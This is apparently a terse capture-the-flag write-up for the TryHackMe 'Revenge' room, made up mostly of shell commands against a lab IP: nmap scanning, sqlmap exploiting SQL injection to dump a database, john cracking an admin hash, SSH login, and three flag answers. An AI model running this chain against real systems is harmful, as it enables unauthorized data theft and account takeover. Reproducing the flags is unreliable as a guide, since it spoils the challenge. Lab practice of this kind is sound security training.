...
```
bibo318@parrot:~/CTFs/tryhackme/Revenge$ cat qTyAhRp.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Revenge$ sudo nmap -A -sS -sC -sV -O 10.10.232.228
...
```
bibo318@parrot:~/CTFs/tryhackme/Revenge$ sqlmap --current-db -u http://10.10.232.228/products/1
        ___
       __H__
...
bibo318@parrot:~/CTFs/tryhackme/Revenge$ sqlmap -D duckyinc --dump -u http://10.10.232.228/products/1
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9#stable}
|_ -| . [)]     | .'| . |
...
```
bibo318@parrot:~/CTFs/tryhackme/Revenge$ john server-admin.hash /usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Revenge$ ssh server-admin@10.10.232.228
...
`thm{br3ak1ng_4nd_3nt3r1ng12**123:))}`

2. flag2

`thm{4lm0st_th3re12**123:))}`

3. flag3

`thm{m1ss10n_acc0mpl1sh3d12**123:))}`
